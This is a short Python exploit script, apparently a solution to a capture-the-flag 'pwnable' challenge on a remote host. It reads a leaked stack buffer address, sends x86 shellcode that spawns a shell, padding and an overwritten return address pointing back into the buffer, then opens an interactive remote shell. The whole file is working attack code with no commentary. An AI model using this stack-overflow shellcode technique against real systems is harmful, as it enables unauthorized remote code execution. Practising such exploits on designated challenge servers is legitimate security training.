#!/usr/bin/env python
from sc_pwn import *

rhp     = ('pwnable.elliptic-shiho.xyz',20061)

#==========
def attack(nc):
    addr_buf = int(nc.read_until('\n').split(' ')[3][:-2],16)
    info('addr_buf  = 0x%08x'%addr_buf)

    sc = ShellCode('x86',0x108)
    shellcode  = sc.sh()
    shellcode += sc.padding()

    exploit  = shellcode
    exploit += pack_32(0xdeadbeef)
    exploit += pack_32(addr_buf)
    nc.send(exploit)
    
    nc.read_all()

#==========

if __name__=='__main__':
    nc = Communicate(rhp)
    attack(nc)

    sh = Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
